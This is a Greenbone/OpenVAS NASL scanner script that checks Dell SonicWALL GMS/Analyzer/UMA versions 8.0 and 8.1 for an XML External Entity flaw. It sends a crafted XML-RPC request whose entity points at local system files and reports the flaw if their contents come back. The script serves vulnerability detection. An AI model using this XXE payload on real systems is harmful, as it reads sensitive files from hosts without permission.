if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.105873" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2016-08-16 14:22:12 +0200 (Tue, 16 Aug 2016)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "Dell SonicWALL GMS/Analyzer/UMA XML External Entity (XXE) Injection" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_dependencies( "gb_dell_sonicwall_gms_detection.sc", "os_detection.sc" );
	script_require_ports( 21009 );
	script_mandatory_keys( "sonicwall/gms/detected" );
	script_tag( name: "summary", value: "Vulnerabilities were found pertaining to command injection, unauthorized XXE,
  default account and unauthorized modification of virtual appliance networking information." );
	script_tag( name: "vuldetect", value: "Send a special crafted XML-RPC POST request and check the response." );
	script_tag( name: "affected", value: "Versions 8.0 and 8.1." );
	script_tag( name: "solution", value: "GMS/Analyzer/UMA Hotfix 174525 is available." );
	script_xref( name: "URL", value: "https://www.digitaldefense.com/vrt-discoveries/" );
	script_xref( name: "URL", value: "https://www.sonicwall.com/en-us/support/knowledge-base/170502432594958" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
port = 21009;
if(!get_port_state( port )){
	exit( 0 );
}
vtstrings = get_vt_strings();
vtstring = vtstrings["default"];
vtstring_lower = vtstrings["lowercase"];
files = traversal_files();
for pattern in keys( files ) {
	file = files[pattern];
	xml_rpc = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" + "<!DOCTYPE " + vtstring + " [<!ELEMENT " + vtstring + " ANY >" + "<!ENTITY " + vtstring_lower + " SYSTEM \"file:///" + file + "\">]>" + "<methodCall><methodName>" + vtstring + "</methodName>" + "<params><param><value><struct><member><name>" + vtstring + "</name>" + "<value><i4>&" + vtstring_lower + ";</i4></value><params><param></methodCall>";
	req = http_post_put_req( port: port, url: "/", data: xml_rpc, add_headers: make_array( "Content-Type", "text/xml" ) );
	buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(egrep( string: buf, pattern: pattern )){
		report = "By sending a special crafted POST request it was possible to read /" + file + ". Response:\n\n" + buf;
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

